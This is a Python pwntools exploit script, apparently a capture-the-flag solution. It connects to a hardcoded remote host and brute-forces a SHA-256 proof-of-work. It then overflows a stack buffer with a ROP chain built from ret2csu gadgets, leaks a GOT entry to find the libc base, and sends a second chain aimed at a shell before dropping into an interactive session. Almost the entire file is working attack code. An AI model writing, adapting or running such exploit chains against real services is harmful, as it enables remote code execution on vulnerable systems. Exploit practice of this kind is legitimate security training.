#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
from itertools import product
from hashlib import sha256

# Settings
context.terminal = ['tmux', 'splitw', '-h']

io = remote("47.91.226.78", 10005)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
#io = process("./bs")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (addr))

chs = string.ascii_letters+string.digits

def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

proof()

io.recvuntil('How many bytes do you want to send?')

pop_rdi_ret = 0x0000000000400c03 # pop rdi ; ret

payload = ''
#payload += 'A'*0x10
#payload = payload.ljust(0x1010, "A")
payload += 'A'*0x1010
payload += p64(0xdeadbeefdeadbeef)
payload += p64(pop_rdi_ret) # ret
payload += p64(0x601FE0) # fgets_got
payload += p64(0x4007C0) # puts_plt
payload += p64(0x400bfa) # univ_1
payload += p64(0x0) # rbx
payload += p64(0x1) # rbp
payload += p64(0x601FD0) # r12 got_read
payload += p64(0x100) # r13 rdx
payload += p64(0x00602800) # r14 rsi
payload += p64(0x0) # r15 rdi
payload += p64(0x400be0) # univ_2

payload += p64(0x0) # rbx
payload += p64(0x0) # rbx
payload += p64(0x602800) # rbp
payload += p64(0x0) # r12 got_read
payload += p64(0x0) # r13 rdx
payload += p64(0x0) # r14 rsi
payload += p64(0x0) # r15 rdi

payload += p64(0x400A9B) # leave ret


payload = payload.ljust(0x2000, 'A')
io.sendline(str(len(payload)+1))

#attach(0x400A9C)
io.sendline(payload)

io.recvuntil("It's time to say goodbye.\n")
libc_fgets = u64(io.recv(6).ljust(0x8, '\0'))
libc_base = libc_fgets-0x000000000006dad0

log.info("%016x" % libc_fgets)

payload1 = ''
payload1 += p64(libc_base+0xCC770)
payload1 += p64(pop_rdi_ret)
payload1 += p64(libc_base+0x18CD57)
payload1 += p64(0x400bfa) # univ_1
payload1 += p64(0x0) # rbx
payload1 += p64(0x1) # rbp
payload1 += p64(0x602800) # r12 got_read
payload1 += p64(0x0) # r13 rdx
payload1 += p64(0x0) # r14 rsi
payload1 += p64(libc_base+0x18CD57)
payload1 += p64(0x400be0) # univ_2

payload1 += p64(0x0) # rbx
payload1 += p64(0x0) # rbx
payload1 += p64(0x602800) # rbp
payload1 += p64(0x0) # r12 got_read
payload1 += p64(0x0) # r13 rdx
payload1 += p64(0x0) # r14 rsi
payload1 += p64(0x0) # r15 rdi
payload1 += p64(pop_rdi_ret) # univ_2
payload1 += p64(libc_base+0x18CD57)
payload1 += p64(libc_base+0xCC770)

io.sendline(payload1)

io.interactive()
